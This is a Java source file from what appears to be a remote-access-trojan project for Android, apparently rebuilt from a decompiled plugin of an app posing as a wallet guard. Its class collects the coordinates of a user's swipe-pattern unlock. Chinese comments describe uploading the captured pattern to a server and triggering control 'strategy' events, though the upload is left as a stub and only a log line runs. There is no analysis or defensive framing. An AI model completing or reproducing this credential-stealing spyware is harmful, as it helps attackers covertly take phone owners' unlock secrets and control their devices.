package com.vendor.rat.control.plug;

import android.util.Log;
import java.io.Serializable;
import java.util.LinkedList;
import java.util.Objects;
import java.util.concurrent.atomic.AtomicReference;

/**
 * 滑动图案密码收集器
 * vendor: com.guard.wallet.plug.d
 *
 * 字段:
 *   - listenHelper (ReqListenHelper)
 *   - patternPoints (LinkedList) 图案坐标点
 *   - delegateId (AtomicReference<String>)
 */
public final class PatternCipherCollector implements Serializable {

    private static final String TAG = "PatternCipherCollector";

    // TODO: VENDOR_VERIFY - 需要 ReqListenHelper VO
    public Object listenHelper;
    public final LinkedList patternPoints = new LinkedList();
    public final AtomicReference<String> delegateId = new AtomicReference<>(null);

    /**
     * 提交收集到的图案密码
     * vendor: plug.d.a()
     *
     * 逻辑:
     *   if listenType == 1 → 构建 ReqUnlockDeviceVO (PATTERN) → 上报 + 触发策略
     *   else → 构建 RespCipherStateVO → 上报监听结果
     *   最后清空 patternPoints 和 delegateId
     */
    @SuppressWarnings("unchecked")
    public final void submit() {
        Object helper = this.listenHelper;
        AtomicReference<String> ref = this.delegateId;
        LinkedList points = this.patternPoints;

        if (helper != null && !points.isEmpty()) {
            // TODO: VENDOR_VERIFY - 需要 ReqListenHelper.getListenType()
            // if listenType == 1:
            //   构建 ReqUnlockDeviceVO, setCipherGradeCode("PASSWORD_QUALITY_PATTERN")
            //   setPatternCipher(points copy)
            //   上报到服务器 + 触发策略事件
            // else:
            //   构建 RespCipherStateVO, 设置 listenType/listenId/subscribeId
            //   setCipherGradeCode("PASSWORD_QUALITY_PATTERN")
            //   setPatternCipher(points copy)
            //   上报监听结果
            Log.d(TAG, "Pattern cipher collected, points=" + points.size());
        }

        ref.set(null);
        points.clear();
    }
}
